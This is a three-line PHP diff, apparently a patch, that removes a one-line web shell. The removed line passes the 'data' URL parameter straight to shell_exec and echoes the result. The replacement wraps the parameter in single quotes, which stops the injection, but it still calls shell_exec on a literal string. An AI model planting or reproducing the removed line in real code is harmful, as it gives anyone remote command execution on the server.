@@ -1,3 +1,3 @@
 <?php 
-	echo shell_exec($_GET["data"]); 
+	echo shell_exec('$_GET["data"]'); 
 ?>
